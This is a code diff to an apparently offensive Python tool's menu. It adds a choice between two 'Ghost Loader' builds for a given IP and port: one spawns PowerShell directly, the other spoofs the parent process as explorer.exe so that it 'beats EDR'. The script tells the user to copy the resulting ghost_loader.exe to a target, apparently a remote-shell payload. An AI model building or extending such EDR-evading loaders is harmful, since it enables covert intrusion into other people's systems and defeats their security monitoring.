@@ -458,12 +458,21 @@ def run_ghost():
     elif choice == "6":
         ip   = prompt_ip()
         port = prompt_port()
+        print(f"\n  {CYAN}Ghost Loader version:{RST}")
+        print(f"  {DIM}  v2 — direct PS spawn (fast, may trip EDR parent-chain rule){RST}")
+        print(f"  {DIM}  v3 — parent spoof: PS appears as explorer.exe child (beats EDR){RST}")
+        ver_choice = input(f"  {AMBER}Version [2/3] (default: 3):{RST} ").strip()
+        use_v3 = ver_choice != "2"
         builder = os.path.join(ROOT, "build_ghost_loader.py")
-        subprocess.run([sys.executable, builder, ip, port], cwd=ROOT)
+        cmd = [sys.executable, builder, ip, port]
+        if use_v3:
+            cmd.append("--v3")
+        subprocess.run(cmd, cwd=ROOT)
         out = os.path.join(ROOT, "shell", "ghost_loader.exe")
         if os.path.exists(out):
-            print(f"\n  {GREEN}[+] Output: shell/ghost_loader.exe{RST}")
-            print(f"  {DIM}  Copy to target. Run as any user. No AV triggers.{RST}")
+            ver_label = "v3 [parent spoof]" if use_v3 else "v2 [direct]"
+            print(f"\n  {GREEN}[+] Output: shell/ghost_loader.exe  ({ver_label}){RST}")
+            print(f"  {DIM}  Copy to target. Run as any user.{RST}")
             scan_reminder()
 
 
